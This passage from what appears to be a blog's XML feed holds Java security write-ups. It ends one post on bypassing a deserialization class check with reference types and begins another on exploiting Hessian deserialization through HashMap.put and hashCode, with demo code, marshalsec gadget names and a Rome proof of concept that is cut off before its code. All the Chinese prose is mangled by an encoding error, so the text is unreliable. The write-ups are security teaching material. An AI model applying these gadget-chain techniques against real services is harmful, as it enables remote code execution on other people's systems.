class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">switch</span> (tc) &#123;<br>                <span class="hljs-keyword">case</span> TC_NULL:<br>                    <span class="hljs-keyword">return</span> readNull();<br>                <span class="hljs-keyword">case</span> TC_REFERENCE:<br>                    <span class="hljs-keyword">return</span> readHandle(unshared);<br>                <span class="hljs-keyword">case</span> TC_CLASS:<br>                    <span class="hljs-keyword">return</span> readClass(unshared);<br>                <span class="hljs-keyword">case</span> TC_CLASSDESC:<br>                <span class="hljs-keyword">case</span> TC_PROXYCLASSDESC:<br>                    <span class="hljs-keyword">return</span> readClassDesc(unshared);<br>                <span class="hljs-keyword">case</span> TC_STRING:<br>                <span class="hljs-keyword">case</span> TC_LONGSTRING:<br>                    <span class="hljs-keyword">return</span> checkResolve(readString(unshared));<br>                <span class="hljs-keyword">case</span> TC_ARRAY:<br>                    <span class="hljs-keyword">return</span> checkResolve(readArray(unshared));<br>                <span class="hljs-keyword">case</span> TC_ENUM:<br>                    <span class="hljs-keyword">return</span> checkResolve(readEnum(unshared));<br>                <span class="hljs-keyword">case</span> TC_OBJECT:<br>                    <span class="hljs-keyword">return</span> checkResolve(readOrdinaryObject(unshared));<br>                <span class="hljs-keyword">case</span> TC_EXCEPTION:<br>                    <span class="hljs-type">IOException</span> <span class="hljs-variable">ex</span> <span class="hljs-operator">=</span> readFatalException();<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WriteAbortedException</span>(<span class="hljs-string">&quot;writing aborted&quot;</span>, ex);<br>                <span class="hljs-keyword">case</span> TC_BLOCKDATA:<br>                <span class="hljs-keyword">case</span> TC_BLOCKDATALONG:<br>                    <span class="hljs-keyword">if</span> (oldMode) &#123;<br>                        bin.setBlockDataMode(<span class="hljs-literal">true</span>);<br>                        bin.peek();             <span class="hljs-comment">// force header read</span><br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OptionalDataException</span>(<br>                            bin.currentBlockRemaining());<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StreamCorruptedException</span>(<br>                            <span class="hljs-string">&quot;unexpected block data&quot;</span>);<br>                    &#125;<br>                <span class="hljs-keyword">case</span> TC_ENDBLOCKDATA:<br>                    <span class="hljs-keyword">if</span> (oldMode) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OptionalDataException</span>(<span class="hljs-literal">true</span>);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StreamCorruptedException</span>(<br>                            <span class="hljs-string">&quot;unexpected end of block data&quot;</span>);<br>                    &#125;<br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StreamCorruptedException</span>(<br>                        String.format(<span class="hljs-string">&quot;invalid type code: %02X&quot;</span>, tc));<br>            &#125;<br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä¸åŒcaseä¸­å¤§éƒ¨åˆ†ç±»éƒ½ä¼šæœ€ç»ˆè°ƒç”¨<code>readClassDesc</code>å»è·å–ç±»çš„æè¿°ç¬¦ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­å¦‚æœå½“å‰ååºåˆ—åŒ–æ•°æ®ä¸‹ä¸€ä½ä»ç„¶æ˜¯<code>TC_CLASSDESC</code>é‚£ä¹ˆå°±ä¼šåœ¨<code>readNonProxyDesc</code>ä¸­è§¦å‘<code>resolveClass</code></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032239877.png" alt="image-20230511210810954"></p><p>ä¸Šé¢è¿™ä¸ªswitchåˆ†æ”¯çš„ä»£ç ï¼Œä¸ä¼šè°ƒç”¨<code>readClassDesc</code>çš„åˆ†æ”¯æœ‰<code>TC_NULL</code>ã€<code>TC_REFERENCE</code>ã€<code>TC_STRING</code>ã€<code>TC_LONGSTRING</code>ã€<code>TC_EXCEPTION</code></p><p>æ‰€ä»¥æ€è·¯æ˜¯æ”¾ä¸¤ä¸ªç±»è¿›å»ï¼Œå¹¶ä¸”ç¬¬äºŒä¸ªç±»å¿…é¡»æ˜¯<code>TC_NULL</code>ã€<code>TC_REFERENCE</code>ã€<code>TC_STRING</code>ã€<code>TC_LONGSTRING</code>ã€<code>TC_EXCEPTION</code>ä¸­çš„ä¸€ä¸ªï¼Œè¿™é‡Œåˆ©ç”¨å¼•ç”¨ç±»å‹ï¼ˆå› ä¸ºå…¶ä»–ç±»å‹è¦ä¹ˆæ¯«æ— ç”¨å¤„ï¼Œè¦ä¹ˆç”¨äºè§£å†³åºåˆ—åŒ–ç»ˆæ­¢ç›¸å…³ï¼‰</p><h3 id="å¼•ç”¨ç±»å‹çš„åˆ©ç”¨"><a href="#å¼•ç”¨ç±»å‹çš„åˆ©ç”¨" class="headerlink" title="å¼•ç”¨ç±»å‹çš„åˆ©ç”¨"></a>å¼•ç”¨ç±»å‹çš„åˆ©ç”¨</h3><p>å½“å‘Listã€setã€mapç±»å‹ä¸­æ·»åŠ åŒæ ·å¯¹è±¡æ—¶å³å¯æˆåŠŸåˆ©ç”¨ï¼Œè¿™é‡Œä¹Ÿç®€å•æä¸€ä¸‹ï¼Œè¿™é‡Œä»¥Listä¸ºä¾‹ï¼Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">ArrayList&lt;Object&gt; arrayList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>arrayList.add(templates);<br>arrayList.add(templates);<br>writeObjects(arrayList);<br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬å†™å…¥åŒæ ·çš„å¯¹è±¡æ—¶ï¼Œç¬¬äºŒä¸ªä¼šå˜æˆå¼•ç”¨ç±»å‹</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032239655.png" alt="image-20230511211004050"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> java </tag>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hessianååºåˆ—åŒ–</title>
      <link href="/2023/01/30/Hessian%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/01/30/Hessian%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="Hessian-ååºåˆ—åŒ–"><a href="#Hessian-ååºåˆ—åŒ–" class="headerlink" title="Hessian ååºåˆ—åŒ–"></a>Hessian ååºåˆ—åŒ–</h1><h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><h3 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h3><p>Remote Procedure Call Protocolï¼Œè¿œç¨‹è¿‡ç¨‹è°ƒç”¨åè®®ï¼Œå’Œ RMIï¼ˆRemote Method Invocationï¼Œè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼‰ç±»ä¼¼ï¼Œéƒ½èƒ½é€šè¿‡ç½‘ç»œè°ƒç”¨è¿œç¨‹æœåŠ¡ï¼Œä½† RPC æ˜¯ä»¥æ ‡å‡†çš„äºŒè¿›åˆ¶æ ¼å¼æ¥å®šä¹‰è¯·æ±‚çš„ä¿¡æ¯ï¼Œå¯ç”¨å®ç°è·¨è¯­è¨€å’Œè·¨æ“ä½œç³»ç»Ÿé€šè®¯ã€‚</p><p>é€šè®¯è¿‡ç¨‹ï¼š</p><p>1.å®¢æˆ·ç«¯å‘èµ·è¯·æ±‚ï¼Œå¹¶æŒ‰ç…§ RPC åè®®æ ¼å¼å¡«å……ä¿¡æ¯<br>2.å¡«å……å®Œæ¯•åå°†äºŒè¿›åˆ¶æ ¼å¼æ–‡ä»¶è½¬åŒ–ä¸ºæµï¼Œé€šè¿‡ä¼ è¾“åè®®è¿›è¡Œä¼ è¾“<br>3.æœåŠ¡ç«¯æ¥æ”¶åˆ°æµåï¼Œå°†å…¶è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ ¼å¼æ–‡ä»¶ï¼Œå¹¶æŒ‰ç…§ RPC åè®®æ ¼å¼è·å–è¯·æ±‚ä¿¡æ¯å¹¶è¿›è¡Œå¤„ç†<br>4.å¤„ç†å®Œæ¯•åå°†ç»“æœæŒ‰ç…§ RPC åè®®æ ¼å¼å†™å…¥äºŒè¿›åˆ¶æ ¼å¼æ–‡ä»¶ä¸­å¹¶è¿”å›</p><p>maven æ·»åŠ æ‰©å±•ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.caucho<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>hessian<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.63<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="Hessianååºåˆ—åŒ–ä¸åŸç”Ÿååºåˆ—åŒ–çš„åŒºåˆ«"><a href="#Hessianååºåˆ—åŒ–ä¸åŸç”Ÿååºåˆ—åŒ–çš„åŒºåˆ«" class="headerlink" title="Hessianååºåˆ—åŒ–ä¸åŸç”Ÿååºåˆ—åŒ–çš„åŒºåˆ«"></a>Hessianååºåˆ—åŒ–ä¸åŸç”Ÿååºåˆ—åŒ–çš„åŒºåˆ«</h3><p>ç¤ºä¾‹ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Code</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> String name=<span class="hljs-string">&quot;ttt&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age=<span class="hljs-number">222</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span>&#123;<br>        System.out.print(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åŸç”Ÿåºåˆ—åŒ–ååºåˆ—åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(ser);<br>        oser.writeObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Code</span>());<br>        oser.close();<br><br>        System.out.println(ser);<br>        ObjectInputStream unser=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(ser.toByteArray()));<br>        Object newobj=unser.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236138.png" alt="image-20230126221405110"></p><p>Hessianåºåˆ—åŒ–ååºåˆ—åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianInput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianOutput;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">hessianDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        HessianOutput hessianOutput=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(ser);<br>        hessianOutput.writeObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Code</span>());<br>        hessianOutput.close();<br><br>        System.out.println(ser);<br><br>        HessianInput hessianInput=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(ser.toByteArray()));<br>        hessianInput.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072235712.png" alt="image-20230126222015375"></p><blockquote><p>ä»è¿è¡Œç»“æœä¸­å¯ä»¥çœ‹å‡ºï¼Œ<code>Hessian</code>ååºåˆ—åŒ–ä¸ä¼šè‡ªåŠ¨è°ƒç”¨ååºåˆ—åŒ–ç±»çš„<code>readObject</code>æ–¹æ³•ï¼Œè¿™ä¹Ÿå°±ç›´æ¥å¯¼è‡´JDKåŸç”Ÿååºåˆ—åŒ–çš„å¤§å¤šæ•°<code>gadget</code>åœ¨<code>Hessian</code>ååºåˆ—åŒ–ä¸­æ˜¯ä¸èƒ½ç”¨çš„ã€‚</p><p>è¿˜æœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„åŒºåˆ«ï¼Œ<code>hessian</code>ååºåˆ—åŒ–ä¸­åºåˆ—åŒ–çš„ç±»ä¸éœ€è¦å®ç°åºåˆ—åŒ–æ¥å£ã€‚</p></blockquote><h3 id="Hessianååºåˆ—åŒ–æ¼æ´"><a href="#Hessianååºåˆ—åŒ–æ¼æ´" class="headerlink" title="Hessianååºåˆ—åŒ–æ¼æ´"></a>Hessianååºåˆ—åŒ–æ¼æ´</h3><p>è™½ç„¶<code>Hessian</code>ååºåˆ—åŒ–ä¸ä¼šè‡ªåŠ¨è°ƒç”¨ååºåˆ—åŒ–ç±»çš„<code>readObject</code>æ–¹æ³•ï¼Œä½†å…¶ä¹Ÿæœ‰è‡ªå·±çš„ç‰¹æ€§ï¼Œå½“å…¶ååºåˆ—åŒ–<code>Map</code>ç±»å‹çš„å¯¹è±¡çš„æ—¶å€™ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨å…¶<code>put</code>æ–¹æ³•ï¼Œå†™ä¸ªdemoè¯•è¯•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">testMap</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HashMap</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">put</span><span class="hljs-params">(Object key, Object value)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.put(key, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åååºåˆ—åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianInput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianOutput;<br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">hessianDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        testMap tt=<span class="hljs-keyword">new</span> <span class="hljs-title class_">testMap</span>();<br>        tt.put(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>);<br>        ByteArrayOutputStream ser=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">HessianOutput</span> <span class="hljs-variable">hessianOutput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(ser);<br>        hessianOutput.writeObject(tt);<br>        System.out.println(ser);<br>        <span class="hljs-type">HessianInput</span> <span class="hljs-variable">hessianInput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(ser.toByteArray()));<br>        hessianInput.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072235097.png" alt="image-20230126224841023"></p><p>å¯ä»¥çœ‹åˆ°ç¡®å®è°ƒç”¨äº†<code>put</code>æ–¹æ³•ï¼Œè¿™æ—¶çœ‹åˆ°<code>HashMap</code>çš„<code>put</code>æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236935.png" alt="image-20230130233718255"></p><p>å¯¹<code>key</code>è°ƒç”¨<code>hash</code>æ–¹æ³•è¿›è¡Œå¤„ç†</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236365.png" alt="image-20230126225301457"></p><p>åªè¦<code>key</code>ä¸ä¸ºç©ºï¼Œå°±ä¼šè°ƒç”¨å…¶<code>hashCode</code>æ–¹æ³•ï¼Œæ€è·¯ä¸€ä¸‹å°±æ‰“å¼€äº†ï¼Œä¹‹å‰çœ‹è¿‡çš„åˆ©ç”¨é“¾ä¸­æœ‰éƒ¨åˆ†å°±ç”¨åˆ°äº†<code>hashCode</code>æ–¹æ³•ï¼Œæ¯”å¦‚<code>rome</code>ï¼Œåˆæ¯”å¦‚cc6ç­‰ã€‚</p><p>å°±å¦‚åŸç”ŸJDKæœ‰<code>ysoserial</code>ï¼Œ<code>Hessian</code>ä¹Ÿæœ‰å¯¹åº”çš„å·¥å…·ç”Ÿæˆ<code>paylaod</code>ã€‚<a href="https://github.com/mbechler/marshalsec">marshalsec</a>ä¸­å°±é›†æˆäº†<code>Hessian</code>ååºåˆ—åŒ–çš„<code>gadget</code>ï¼Œå¯ä»¥ä½¿ç”¨å…¶ç”Ÿæˆ<code>paylaod</code>ï¼Œè¯¥å·¥å…·ä¸­é›†æˆäº†5ä¸ª<code>gadget</code></p><ul><li>Rome</li><li>XBean</li><li>Resin</li><li>SpringPartiallyComparableAdvisorHolder</li><li>SpringPartiallyComparableAdvisorHolder</li></ul><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h3 id="è§¦å‘ç‚¹"><a href="#è§¦å‘ç‚¹" class="headerlink" title="è§¦å‘ç‚¹"></a>è§¦å‘ç‚¹</h3><p>ç”±äº Hessian ä¼šåŠ ä½ ä¸ªåºåˆ—åŒ–çš„ç»“æœå¤„ç†æˆä¸€ä¸ª Mapï¼Œæ‰€æœ‰åºåˆ—åŒ–çš„ç»“æœçš„ bytes çš„ç¬¬ä¸€ä¸ª byte æ€»ä¸º Mï¼ˆ77ï¼‰,ä¼šè¿›å…¥è¿™ä¸ªcase</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;M&#x27;</span>: &#123;<br>      <span class="hljs-type">String</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> readType();<br><br>      <span class="hljs-keyword">return</span> _serializerFactory.readMap(<span class="hljs-built_in">this</span>, type);<br>    &#125;<br></code></pre></td></tr></table></figure><p>è·Ÿè¿›readMap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">readMap</span><span class="hljs-params">(AbstractHessianInput in, String type)</span><br>    <span class="hljs-keyword">throws</span> HessianProtocolException, IOException<br>  &#123;<br>    <span class="hljs-type">Deserializer</span> <span class="hljs-variable">deserializer</span> <span class="hljs-operator">=</span> getDeserializer(type);<br></code></pre></td></tr></table></figure><p>è·Ÿè¿›getDeserializerï¼Œåˆ›å»ºä¸€ä¸ª HashMap ä½œä¸ºç¼“å­˜ï¼Œå…ˆå°†è¦ååºåˆ—åŒ–çš„ç±»ä½œä¸º key æ”¾å…¥ HashMap ä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Deserializer <span class="hljs-title function_">getDeserializer</span><span class="hljs-params">(String type)</span><br>  <span class="hljs-keyword">throws</span> HessianProtocolException<br>&#123;<br>  <span class="hljs-comment">//...</span><br><span class="hljs-keyword">if</span> (deserializer != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (_cachedTypeDeserializerMap == <span class="hljs-literal">null</span>)<br>      _cachedTypeDeserializerMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(<span class="hljs-number">8</span>);<br><br>    <span class="hljs-keyword">synchronized</span> (_cachedTypeDeserializerMap) &#123;<br>      _cachedTypeDeserializerMap.put(type, deserializer);<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> deserializer;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¼šè°ƒç”¨ HashMap.put æ–¹æ³•ï¼Œç»“åˆä¹‹å‰åˆ†æè¿‡çš„ CC é“¾ï¼Œåç»­è°ƒç”¨çš„ hash å‡½æ•°èƒ½è§¦å‘ä»»æ„ç±»çš„ hashcode æ–¹æ³•ã€‚é‚£ä¹ˆåªéœ€è¦æ‰¾ä¸€æ¡å…¥å£ä¸º hashcode çš„ååºåˆ—åŒ–é“¾å³å¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Rome<br>XBean<br>Resin<br>SpringPartiallyComparableAdvisorHolder<br>SpringAbstractBeanFactoryPointcutAdvisor<br></code></pre></td></tr></table></figure><h2 id="æ‰“Rome"><a href="#æ‰“Rome" class="headerlink" title="æ‰“Rome"></a>æ‰“Rome</h2><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span 